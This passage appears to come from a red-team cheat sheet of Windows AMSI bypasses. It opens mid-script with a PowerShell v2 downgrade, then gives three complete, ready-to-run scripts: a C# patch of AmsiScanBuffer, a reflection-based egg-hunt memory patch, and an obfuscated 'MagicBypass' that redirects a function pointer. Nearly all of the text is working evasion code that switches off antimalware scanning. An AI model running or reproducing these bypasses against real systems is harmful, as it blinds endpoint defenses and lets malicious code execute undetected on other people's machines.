            Write-Verbose "Using PowerShell version 2 which doesn't support AMSI."
            if ($ShowOnly -eq $True)
            {
                Write-Output "If .Net version 2.0.50727 is installed, run powershell -v 2 and run scripts from the new PowerShell process."
            }
            else
            {
                Write-Verbose "Checking if .Net version 2.0.50727 is installed."
                $versions = Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -recurse | Get-ItemProperty -name Version -EA 0 | Where { $_.PSChildName -match '^(?!S)\p{L}'} | Select -ExpandProperty Version
                if($versions -match "2.0.50727")
                {
                    Write-Verbose ".Net version 2.0.50727 found."
                    Write-Output "Executing the bypass."
                    powershell.exe -version 2
                }
                else
                {
                    Write-Verbose ".Net version 2.0.50727 not found. Can't start PowerShell v2."
                }
            }
        }
        
        "obfuscation"
        {
            Write-Output "AMSI and the AVs which support it can be bypassed using obfuscation techqniues."
            Write-Output "ISE-Steroids (http://www.powertheshell.com/isesteroidsmanual/download/) and Invoke-Obfuscation can be used (https://github.com/danielbohannon/Invoke-Obfuscation)."
        }
    }

}
```


# Adam Chester Patch #
Bypass Update by Adam Chester https://twitter.com/_xpn_/status/1170852932650262530
```
$Winpatch = @"
using System;
using System.Runtime.InteropServices;

public class patch
{
    // https://twitter.com/_xpn_/status/1170852932650262530
    static byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    static byte[] x86 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };

    public static void it()
    {
        if (is64Bit())
            PatchAmsi(x64);
        else
            PatchAmsi(x86);
    }

    private static void PatchAmsi(byte[] patch)
    {
        try
        {
            var lib = Win32.LoadLibrary("a" + "ms" + "i.dll");
            var addr = Win32.GetProcAddress(lib, "AmsiScanBuffer");

            uint oldProtect;
            Win32.VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out oldProtect);

            Marshal.Copy(patch, 0, addr, patch.Length);
            Console.WriteLine("Patch Sucessfull");
        }
        catch (Exception e)
        {
            Console.WriteLine(" [x] {0}", e.Message);
            Console.WriteLine(" [x] {0}", e.InnerException);
        }
    }

    private static bool is64Bit()
        {
            bool is64Bit = true;

            if (IntPtr.Size == 4)
                is64Bit = false;

            return is64Bit;
        }
}

class Win32
{
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type -TypeDefinition $Winpatch -Language CSharp
[patch]::it()
```
# Modified Amsi ScanBuffer Patch

No more CSC.exe compilation
@Credit to:
https://www.redteam.cafe/red-team/powershell/using-reflection-for-amsi-bypass

```
Write-Host "-- AMSI Patch"
Write-Host "-- Modified By: Shantanu Khandelwal (@shantanukhande)"
Write-Host "-- Original Author: Paul Laîné (@am0nsec)"
Write-Host ""

Class Hunter {
    static [IntPtr] FindAddress([IntPtr]$address, [byte[]]$egg) {
        while ($true) {
            [int]$count = 0

            while ($true) {
                [IntPtr]$address = [IntPtr]::Add($address, 1)
                If ([System.Runtime.InteropServices.Marshal]::ReadByte($address) -eq $egg.Get($count)) {
                    $count++
                    If ($count -eq $egg.Length) {
                        return [IntPtr]::Subtract($address, $egg.Length - 1)
                    }
                } Else { break }
            }
        }

        return $address
    }
}
function Get-ProcAddress {
    Param(
        [Parameter(Position = 0, Mandatory = $True)] [String] $Module,
        [Parameter(Position = 1, Mandatory = $True)] [String] $Procedure
    )

    # Get a reference to System.dll in the GAC
    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
    # Get a reference to the GetModuleHandle and GetProcAddress methods
    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))
    # Get a handle to the module specified
    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
    $tmpPtr = New-Object IntPtr
    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
    # Return the address of the function
    return $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
}
function Get-DelegateType
{
    Param
    (
        [OutputType([Type])]
            
        [Parameter( Position = 0)]
        [Type[]]
        $Parameters = (New-Object Type[](0)),
            
        [Parameter( Position = 1 )]
        [Type]
        $ReturnType = [Void]
    )

    $Domain = [AppDomain]::CurrentDomain
    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
        
    Write-Output $TypeBuilder.CreateType()
}
$LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
$LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
$LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
$GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
$GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
$GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
$VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
$VistualProtectDelegate =  Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VistualProtectDelegate)


If ([IntPtr]::Size -eq 8) {
    Write-Host "[+] 64-bits process"
    [byte[]]$egg = [byte[]] (
        0x4C, 0x8B, 0xDC,       # mov     r11,rsp
        0x49, 0x89, 0x5B, 0x08, # mov     qword ptr [r11+8],rbx
        0x49, 0x89, 0x6B, 0x10, # mov     qword ptr [r11+10h],rbp
        0x49, 0x89, 0x73, 0x18, # mov     qword ptr [r11+18h],rsi
        0x57,                   # push    rdi
        0x41, 0x56,             # push    r14
        0x41, 0x57,             # push    r15
        0x48, 0x83, 0xEC, 0x70  # sub     rsp,70h
    )
} Else {
    Write-Host "[+] 32-bits process"
    [byte[]]$egg = [byte[]] (
        0x8B, 0xFF,             # mov     edi,edi
        0x55,                   # push    ebp
        0x8B, 0xEC,             # mov     ebp,esp
        0x83, 0xEC, 0x18,       # sub     esp,18h
        0x53,                   # push    ebx
        0x56                    # push    esi
    )
}


$hModule = $LoadLibrary.Invoke("amsi.dll")
Write-Host "[+] AMSI DLL Handle: $hModule"
$DllGetClassObjectAddress = $GetProcAddress.Invoke($hModule, "DllGetClassObject")
Write-Host "[+] DllGetClassObject address: $DllGetClassObjectAddress"
[IntPtr]$targetedAddress = [Hunter]::FindAddress($DllGetClassObjectAddress, $egg)
Write-Host "[+] Targeted address: $targetedAddress"

$oldProtectionBuffer = 0
$VirtualProtect.Invoke($targetedAddress, [uint32]2, 4, [ref]$oldProtectionBuffer) | Out-Null

$patch = [byte[]] (
    0x31, 0xC0,    # xor rax, rax
    0xC3           # ret  
)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $targetedAddress, 3)

$a = 0
$VirtualProtect.Invoke($targetedAddress, [uint32]2, $oldProtectionBuffer, [ref]$a) | Out-Null
```



# Patching AmsiScanBuffer Address
## Credit: https://www.offsec.com/offsec/amsi-write-raid-0day-vulnerability/

```
function MagicBypass {

# Define named parameters
param(
    $InitialStart = 0x50000,
    $NegativeOffset= 0x50000,
    $MaxOffset = 0x1000000,
    $ReadBytes = 0x50000
)

$APIs = @"
using System;
using System.ComponentModel;
using System.Management.Automation;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;

public class APIs {
    [DllImport("kernel32.dll")]
    public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, UInt32 nSize, ref UInt32 lpNumberOfBytesRead);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
   
    [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
    public static extern IntPtr GetModuleHandle([MarshalAs(UnmanagedType.LPWStr)] string lpModuleName);

    [MethodImpl(MethodImplOptions.NoOptimization | MethodImplOptions.NoInlining)]
    public static int Dummy() {
     return 1;
    }
}
"@

Add-Type $APIs

$InitialDate=Get-Date;

$string = 'hello, world'
$string = $string.replace('he','a')
$string = $string.replace('ll','m')
$string = $string.replace('o,','s')
$string = $string.replace(' ','i')
$string = $string.replace('wo','.d')
$string = $string.replace('rld','ll')

$string2 = 'hello, world'
$string2 = $string2.replace('he','A')
$string2 = $string2.replace('ll','m')
$string2 = $string2.replace('o,','s')
$string2 = $string2.replace(' ','i')
$string2 = $string2.replace('wo','Sc')
$string2 = $string2.replace('rld','an')

$string3 = 'hello, world'
$string3 = $string3.replace('hello','Bu')
$string3 = $string3.replace(', ','ff')
$string3 = $string3.replace('world','er')

$Address = [APIS]::GetModuleHandle($string)
[IntPtr] $funcAddr = [APIS]::GetProcAddress($Address, $string2 + $string3)

$Assemblies = [appdomain]::currentdomain.getassemblies()
$Assemblies |
  ForEach-Object {
    if($_.Location -ne $null){
     $split1 = $_.FullName.Split(",")[0]
     If($split1.StartsWith('S') -And $split1.EndsWith('n') -And $split1.Length -eq 28) {
       $Types = $_.GetTypes()
     }
    }
}

$Types |
  ForEach-Object {
    if($_.Name -ne $null){
     If($_.Name.StartsWith('A') -And $_.Name.EndsWith('s') -And $_.Name.Length -eq 9) {
       $Methods = $_.GetMethods([System.Reflection.BindingFlags]'Static,NonPublic')
     }
    }
}

$Methods |
  ForEach-Object {
    if($_.Name -ne $null){
     If($_.Name.StartsWith('S') -And $_.Name.EndsWith('t') -And $_.Name.Length -eq 11) {
       $MethodFound = $_
     }
    }
}

[IntPtr] $MethodPointer = $MethodFound.MethodHandle.GetFunctionPointer()
[IntPtr] $Handle = [APIs]::GetCurrentProcess()
$dummy = 0
$ApiReturn = $false
   
:initialloop for($j = $InitialStart; $j -lt $MaxOffset; $j += $NegativeOffset){
    [IntPtr] $MethodPointerToSearch = [Int64] $MethodPointer - $j
    $ReadedMemoryArray = [byte[]]::new($ReadBytes)
    $ApiReturn = [APIs]::ReadProcessMemory($Handle, $MethodPointerToSearch, $ReadedMemoryArray, $ReadBytes,[ref]$dummy)
    for ($i = 0; $i -lt $ReadedMemoryArray.Length; $i += 1) {
     $bytes = [byte[]]($ReadedMemoryArray[$i], $ReadedMemoryArray[$i + 1], $ReadedMemoryArray[$i + 2], $ReadedMemoryArray[$i + 3], $ReadedMemoryArray[$i + 4], $ReadedMemoryArray[$i + 5], $ReadedMemoryArray[$i + 6], $ReadedMemoryArray[$i + 7])
     [IntPtr] $PointerToCompare = [bitconverter]::ToInt64($bytes,0)
     if ($PointerToCompare -eq $funcAddr) {
       Write-Host "Found @ $($i)!"
       [IntPtr] $MemoryToPatch = [Int64] $MethodPointerToSearch + $i
       break initialloop
     }
    }
}
[IntPtr] $DummyPointer = [APIs].GetMethod('Dummy').MethodHandle.GetFunctionPointer()
$buf = [IntPtr[]] ($DummyPointer)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $MemoryToPatch, 1)

$FinishDate=Get-Date;
$TimeElapsed = ($FinishDate - $InitialDate).TotalSeconds;
Write-Host "$TimeElapsed seconds"
}
MagicBypass

```
